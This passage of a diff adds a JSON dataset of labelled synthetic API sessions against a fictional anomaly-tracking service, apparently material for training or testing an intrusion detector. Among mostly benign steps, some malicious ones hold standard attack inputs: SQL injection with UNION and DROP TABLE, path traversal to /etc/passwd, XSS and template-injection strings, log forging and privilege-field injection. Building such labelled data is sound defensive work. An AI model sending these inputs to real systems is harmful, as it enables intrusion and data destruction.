+        },
+        "body": null,
+        "note": "The user inspects the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess025",
+    "client_ip": "192.168.1.34",
+    "steps": [
+      {
+        "id": "sess025-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician25@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess025-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_025"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess025-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-psi-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_025",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "java.util.HashMap@1a2b3c"
+        },
+        "note": "Data error: relabeled from malicious. The value is a Java toString, not a serialized object."
+      },
+      {
+        "id": "sess025-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-psi-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_025"
+        },
+        "body": null,
+        "note": "The user views the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess026",
+    "client_ip": "192.168.1.35",
+    "steps": [
+      {
+        "id": "sess026-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Atlantic's sector"
+        },
+        "headers": {
+          "Accept": "application/json",
+          "X-Debug-Extra": "true"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in query and an extra debug header."
+      },
+      {
+        "id": "sess026-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician26@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess026-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_026"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess026-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omega-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_026"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess027",
+    "client_ip": "192.168.1.36",
+    "steps": [
+      {
+        "id": "sess027-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician27@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess027-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_027"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess027-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_027",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Report\n2026-10-28 10:43:01 WARN [System] Unauthorized access detected",
+          "frequency_hz": 300
+        },
+        "note": "The client attempts a log stamp injection in the title field."
+      },
+      {
+        "id": "sess027-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_027"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess028",
+    "client_ip": "192.168.1.37",
+    "steps": [
+      {
+        "id": "sess028-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician28@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess028-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_028"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess028-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-delta-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_028"
+        },
+        "body": null,
+        "note": "The user opens an anomaly object."
+      },
+      {
+        "id": "sess028-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-delta-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_028"
+        },
+        "body": null,
+        "note": "The user checks another anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess029",
+    "client_ip": "192.168.1.38",
+    "steps": [
+      {
+        "id": "sess029-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user agent string."
+      },
+      {
+        "id": "sess029-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician29@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess029-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_029"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess029-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-beta-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_029"
+        },
+        "body": null,
+        "note": "The user views an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess030",
+    "client_ip": "192.168.1.39",
+    "steps": [
+      {
+        "id": "sess030-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician30@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess030-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_030"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess030-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "10 UNION SELECT * FROM users"
+        },
+        "headers": {
+          "Authorization": "Bearer token_030"
+        },
+        "body": null,
+        "note": "The client attempts a UNION-based query injection."
+      },
+      {
+        "id": "sess030-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-gamma-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_030"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess031",
+    "client_ip": "192.168.1.40",
+    "steps": [
+      {
+        "id": "sess031-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician31@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess031-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-other-user-99",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_031"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The words other-user are only part of the id string."
+      },
+      {
+        "id": "sess031-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_031"
+        },
+        "body": null,
+        "note": "The user returns to listing their own anomalies."
+      },
+      {
+        "id": "sess031-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-theta-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_031"
+        },
+        "body": null,
+        "note": "The user opens a valid anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess032",
+    "client_ip": "192.168.1.41",
+    "steps": [
+      {
+        "id": "sess032-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Harmless-Field": "test-value"
+        },
+        "body": null,
+        "note": "The client includes a harmless extra custom header."
+      },
+      {
+        "id": "sess032-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician32@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess032-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_032"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess032-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-iota-05",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_032"
+        },
+        "body": null,
+        "note": "The user checks an anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess033",
+    "client_ip": "192.168.1.42",
+    "steps": [
+      {
+        "id": "sess033-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician33@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess033-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_033"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess033-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/v1/anomalies/anomaly-kappa-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_033",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Title",
+          "permissions": "admin"
+        },
+        "note": "The client attempts to inject a permissions privilege field."
+      },
+      {
+        "id": "sess033-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-kappa-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_033"
+        },
+        "body": null,
+        "note": "The user views the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess034",
+    "client_ip": "192.168.1.43",
+    "steps": [
+      {
+        "id": "sess034-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician34@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess034-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_034"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess034-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies/..%2f..%2fetc%2fpasswd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_034"
+        },
+        "body": null,
+        "note": "The client attempts url-encoded directory traversal."
+      },
+      {
+        "id": "sess034-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-lambda-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_034"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess035",
+    "client_ip": "192.168.1.44",
+    "steps": [
+      {
+        "id": "sess035-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician35@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess035-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_035"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess035-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-mu-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_035",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<svg/onload=alert(1)>"
+        },
+        "note": "The client attempts an SVG onload script injection."
+      },
+      {
+        "id": "sess035-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-mu-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_035"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess036",
+    "client_ip": "192.168.1.45",
+    "steps": [
+      {
+        "id": "sess036-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Northern\nsector"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes a newline in the region query parameter."
+      },
+      {
+        "id": "sess036-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician36@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess036-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_036"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess036-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-nu-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_036"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess037",
+    "client_ip": "192.168.1.46",
+    "steps": [
+      {
+        "id": "sess037-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician37@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess037-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_037"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess037-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_037",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Anomaly",
+          "frequency_hz": 500,
+          "notes": "[http://10.0.0.1/admin](http://10.0.0.1/admin)"
+        },
+        "note": "The client attempts to reference an internal private network address."
+      },
+      {
+        "id": "sess037-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_037"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess038",
+    "client_ip": "192.168.1.47",
+    "steps": [
+      {
+        "id": "sess038-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician38@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess038-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_038"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess038-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-xi-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_038",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "${7*7}"
+        },
+        "note": "The client attempts a template injection expression."
+      },
+      {
+        "id": "sess038-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-xi-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_038"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess039",
+    "client_ip": "192.168.1.48",
+    "steps": [
+      {
+        "id": "sess039-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician39@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess039-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_039"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess039-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-omicron-01/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_039",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "rO0ABXNyACpvcmcu..."
+        },
+        "note": "The client attempts to submit serialized object data."
+      },
+      {
+        "id": "sess039-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-omicron-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_039"
+        },
+        "body": null,
+        "note": "The user inspects the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess040",
+    "client_ip": "192.168.1.49",
+    "steps": [
+      {
+        "id": "sess040-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician40@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess040-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_040"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess040-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_040",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Data\n2026-10-28 10:43:02 ERROR [DB] Connection dropped",
+          "frequency_hz": 600
+        },
+        "note": "The client attempts a log stamp injection payload."
+      },
+      {
+        "id": "sess040-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/sessions/recent",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_040"
+        },
+        "body": null,
+        "note": "The user views recent sessions."
+      }
+    ]
+  },
+  {
+    "session_id": "sess041",
+    "client_ip": "192.168.1.50",
+    "steps": [
+      {
+        "id": "sess041-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician41@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess041-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_041"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess041-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-pi-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_041"
+        },
+        "body": null,
+        "note": "The user opens an anomaly object."
+      },
+      {
+        "id": "sess041-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-pi-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_041"
+        },
+        "body": null,
+        "note": "The user checks another anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess042",
+    "client_ip": "192.168.1.51",
+    "steps": [
+      {
+        "id": "sess042-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {
+          "region": "Eastern's trench"
+        },
+        "headers": {
+          "Accept": "application/json"
+        },
+        "body": null,
+        "note": "The client includes an apostrophe in the region query parameter."
+      },
+      {
+        "id": "sess042-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician42@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess042-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_042"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess042-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-rho-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_042"
+        },
+        "body": null,
+        "note": "The user inspects an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess043",
+    "client_ip": "192.168.1.52",
+    "steps": [
+      {
+        "id": "sess043-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician43@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess043-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {
+          "limit": "10; DROP TABLE anomalies"
+        },
+        "headers": {
+          "Authorization": "Bearer token_043"
+        },
+        "body": null,
+        "note": "The client attempts a query injection with a drop command."
+      },
+      {
+        "id": "sess043-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_043"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess043-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-sigma-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_043"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess044",
+    "client_ip": "192.168.1.53",
+    "steps": [
+      {
+        "id": "sess044-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician44@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess044-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_044"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess044-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-unauthorized-88",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_044"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word unauthorized is only part of the id string."
+      },
+      {
+        "id": "sess044-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-tau-03",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_044"
+        },
+        "body": null,
+        "note": "The user views a valid anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess045",
+    "client_ip": "192.168.1.54",
+    "steps": [
+      {
+        "id": "sess045-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician45@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess045-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_045"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess045-s03",
+        "label": "malicious",
+        "method": "PUT",
+        "path": "/v1/anomalies/anomaly-upsilon-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_045",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Update",
+          "access_level": "root"
+        },
+        "note": "The client attempts to inject an access_level privilege field."
+      },
+      {
+        "id": "sess045-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-upsilon-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_045"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess046",
+    "client_ip": "192.168.1.55",
+    "steps": [
+      {
+        "id": "sess046-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/stations/public",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+        },
+        "body": null,
+        "note": "The client uses an outdated browser user agent string."
+      },
+      {
+        "id": "sess046-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician46@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess046-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_046"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess046-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-phi-01",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_046"
+        },
+        "body": null,
+        "note": "The user checks an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess047",
+    "client_ip": "192.168.1.56",
+    "steps": [
+      {
+        "id": "sess047-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician47@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess047-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_047"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess047-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/anomalies/../../etc/hosts",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_047"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal to access system hosts."
+      },
+      {
+        "id": "sess047-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-chi-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_047"
+        },
+        "body": null,
+        "note": "The user views an anomaly record."
+      }
+    ]
+  },
+  {
+    "session_id": "sess048",
+    "client_ip": "192.168.1.57",
+    "steps": [
+      {
+        "id": "sess048-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "acoustician48@riftnote.internal",
+          "password": "Password123!"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess048-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_048"
+        },
+        "body": null,
+        "note": "The user lists anomalies."
+      },
+      {
+        "id": "sess048-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/anomalies/anomaly-psi-02/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_048",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<iframe src=\"javascript:alert(1)\">"
+        },
+        "note": "The client attempts to inject an iframe script execution payload."
+      },
+      {
+        "id": "sess048-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/anomalies/anomaly-psi-02",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token_048"
+        },
+        "body": null,
+        "note": "The user checks the anomaly object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess049",
+    "client_ip": "192.168.1.58",
+    "steps": [
+      {
+        "id": "sess049-s01",
